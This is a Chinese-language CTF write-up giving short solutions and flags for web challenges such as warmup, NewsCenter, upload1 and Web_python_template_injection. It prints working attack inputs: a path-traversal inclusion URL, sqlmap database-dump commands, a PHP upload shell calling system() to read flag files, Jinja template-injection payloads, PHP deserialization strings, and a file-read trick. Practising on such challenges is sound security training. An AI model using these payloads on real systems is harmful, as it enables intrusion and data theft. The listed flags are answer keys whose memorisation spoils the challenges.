# Web

## 进阶

### Training-WWW-Robots

#### [题目描述]:

1. 学习www robots规则

#### [做题思路]:

1. 根据题意尝试访问``/robots.txt``

#### [题解]

1. 访问``robots.txt``页面
2. 访问``/fl0g.php``页面

#### [flag]

1. cyberpeace{2145c26182a49df95ab3dd4945a3875c}

### baby_web

#### [题目描述]:

1. 想想初始页面是哪个

#### [做题思路]:

1. 根据题意尝试``/index.php``或``/``

#### [题解]

1. 初始页面请求头包含flag

#### [flag]

1. flag{very_baby_web}

### warmup

#### [题目描述]:

#### [做题思路]

1. 文件包含

#### [题解]

1. http://111.198.29.45:50507/source.php
2. http://111.198.29.45:50507/?file=hint.php
3. http://111.198.29.45:50507/?file=hint.php?/../../../../../ffffllllaaaagggg

#### [flag]

1. flag{25e7bce6005c4e0c983fb97297ac6e5a}

### NewsCenter

#### [题目描述]:

1. 如题目环境报错，稍等片刻刷新即可

#### [做题思路]:

1. 由于存在输入框，尝试xss和sql注入

#### [题解]

1. 查看数据库：``sqlmap -u "http://111.198.29.45:46880/index.php" --data "search=ss" --dbs ``
2. 查看表内容：``sqlmap -u "http://111.198.29.45:46880/index.php" --data "search=ss" -D news --dump``

#### [flag]

1. QCTF{sq1_inJec7ion_ezzz}

### NaNNaNNaNNaN-Batman

#### [题目描述]:

1. 无

#### [做题思路]:

1. 审计代码和正则表达式

#### [题解]

1. 打开文件发现是js代码，并修改后缀名
2. 审计代码，把eval改成alert，就能拿到源代码，并利用js格式化工具
3. 研究代码正则表达式，构造字符串拿到flag

#### [flag]

1. flag{it's_a_h0le_in_0ne}

### unserialize3

#### [题目描述]

#### [做题思路]

#### [题解]

http://111.198.29.45:58354/?code=O:4:%22xctf%22:2:{s:4:%22flag%22;s:3:%22111%22;}

#### [flag]

1. cyberpeace{cc2d957928a60557adcc5296b9ac462d}

### upload1

#### [题目描述]

#### [做题思路]

1. 绕过js代码验证，直接上传php文件并给出了URL path路径
2. php文件写入命令，查看当前和上级目录文件并读取文件

#### [题解]

1. 新建php文件，写入system("ls ../");system("cat ../flag.php")

#### [flag]

1. cyberpeace{9db7ff4ecdbad06b2eb95d44786368d3}

### Web_python_template_injection

#### [题目描述]

#### [做题思路]

#### [题解]

1. http://xxx/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__["os"].listdir(".")}}
2. http://xxx/{{''.__class__.__mro__[2].__subclasses__()[40]("fl4g").read()}}

#### [flag]

1. ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}

### Web_php_unserialize

#### [题目描述]

#### [题解]

```bash
http://111.198.29.45:52094/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
```

#### [flag]

```bash
ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}
```

### ics-06

#### [题解]

1. 尝试访问index.php, 发现有id
2. 使用Python写个脚本，遍历id

### Cat

#### [题解]

1. url=127.0.0.1|%80
2. 查找ｄatabase数据库
3. url=@/opt/api/database.sqlite3
4. 查找ctf关键字
